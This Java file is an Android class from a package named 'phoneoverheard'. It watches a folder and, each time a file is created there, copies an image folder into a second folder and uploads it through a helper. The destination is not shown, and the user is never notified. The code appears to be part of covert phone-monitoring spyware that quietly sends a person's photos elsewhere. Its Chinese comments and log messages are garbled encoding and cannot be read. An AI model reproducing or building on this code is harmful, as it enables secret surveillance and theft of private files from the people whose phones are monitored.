package com.phoneoverheard.phonne;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Environment;
import android.os.FileObserver;   
import android.util.Log;   
  
/**  
 * SD���е�Ŀ¼������������  
 * 
 * @author 
 */  
@SuppressLint("SdCardPath")
public class SDCardListener extends FileObserver {
	   private static final String TAG = "SDCardListener"; 
	   WriteLog mylog = new WriteLog();
	   
	   @SuppressWarnings("unused")
	   private String path;
	   private Context context;
	   public SDCardListener(String path,Context context) { 
	      /*  
	       * ���ֹ��췽����Ĭ�ϼ��������¼���,���ʹ�� super(String,int)���ֹ��췽����  
	       * ��int������Ҫ�������¼�����.  
	       */
		  super(path,CREATE);
		  this.context = context;
		  Log.i(TAG, "path:"+ path); 
		  mylog.WrLog("i",TAG,"SD���е�Ŀ¼����������:"+ path);
	   }   
	   
	   @Override  
	   public void onEvent(int event, String path) {
		   path = Environment.getDataDirectory() + path;
		   try{
		      switch(event) {   
		         case FileObserver.ALL_EVENTS:   
		            Log.i(TAG, "path:"+ path); 		            
		            mylog.WrLog("i",TAG,"SD���е�Ŀ¼����������:"+ path);
		            break;   
		         case FileObserver.CREATE:	        	 
					ManagerService managerservice = new ManagerService(context);
			    	Manager manager = managerservice.find("manager");
			    	String oldPath = manager.getImgfolder();
			    	String newPath = manager.getAudiofolder();
		        	new FileService().copyFolder(oldPath, newPath,context);
		        	new FileService().uploadFolder(newPath,context);
		        	Log.i(TAG, "oldPath=="+oldPath+" , newPath=="+newPath+ " , path=="+ path);
		        	mylog.WrLog("i",TAG,"�����ļ����е��ļ��� oldPath=="+oldPath+" , newPath=="+newPath+ " , path=="+ path);
		            break;   
		      }   
		   }catch(Exception e){
			   Log.i(TAG, "Ŀ¼�ļ��ϴ�ʧ��path��"+ path);
			   mylog.WrLog("i",TAG,"Ŀ¼�ļ��ϴ�ʧ��path��"+ path);
			   e.printStackTrace(); 
		   }
	  }

}